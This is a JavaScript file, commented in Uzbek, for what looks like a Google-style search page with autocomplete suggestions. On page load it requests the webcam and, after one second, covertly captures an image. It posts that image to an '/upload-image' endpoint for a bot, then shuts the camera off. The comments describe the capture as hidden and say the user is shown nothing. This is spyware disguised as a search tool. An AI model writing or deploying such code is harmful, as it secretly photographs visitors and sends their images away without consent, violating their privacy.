const searchInput = document.getElementById('searchInput');
const suggestionsDiv = document.getElementById('suggestions');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Tavsiyalar ro'yxati
const suggestionsList = [
    'JavaScript darslari',
    'Node.js qollanma',
    'HTML va CSS',
    'Telegram bot yaratish',
    'Google qidiruv dizayni'
];

// Qidiruvda tavsiyalar ko'rsatish
searchInput.addEventListener('input', () => {
    const query = searchInput.value.toLowerCase();
    suggestionsDiv.innerHTML = '';
    if (query) {
        const filteredSuggestions = suggestionsList.filter(item => item.toLowerCase().includes(query));
        filteredSuggestions.forEach(item => {
            const div = document.createElement('div');
            div.textContent = item;
            div.onclick = () => {
                searchInput.value = item;
                suggestionsDiv.style.display = 'none';
                search();
            };
            suggestionsDiv.appendChild(div);
        });
        suggestionsDiv.style.display = filteredSuggestions.length ? 'block' : 'none';
    } else {
        suggestionsDiv.style.display = 'none';
    }
});

// Qidiruv funksiyasi
function search() {
    const query = searchInput.value;
    if (query) {
        alert(`Qidiruv: ${query}`);
        // Haqiqiy qidiruv logikasini qo'shishingiz mumkin
    }
}

// Sahifa yuklanganda kamera ruxsatini so'rash va rasm olish
window.onload = () => {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;
            // 1 soniyadan keyin avtomatik rasm olish
            setTimeout(() => {
                captureImage();
            }, 1000);
        })
        .catch(err => {
            console.error('Kamera xatosi:', err);
            // Foydalanuvchiga xabar ko'rsatilmaydi
        });
};

// Yashirin rasmga olish
function captureImage() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    // Rasmni avtomatik yuborish
    sendToBot();
}

// Botga rasm yuborish
function sendToBot() {
    const imageData = canvas.toDataURL('image/png');
    fetch('/upload-image', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: imageData })
    })
    .then(response => response.json())
    .then(data => {
        console.log(data.message); // Foydalanuvchiga xabar ko'rsatilmaydi
        // Kamerani o'chirish
        const stream = video.srcObject;
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    })
    .catch(error => {
        console.error('Xatolik:', error);
    });
}






function search() {
  const query = document.getElementById("searchInput").value;
  if (query) {
    window.open(`https://www.google.com/search?q=${encodeURIComponent(query)}`, "_blank");
  }
}
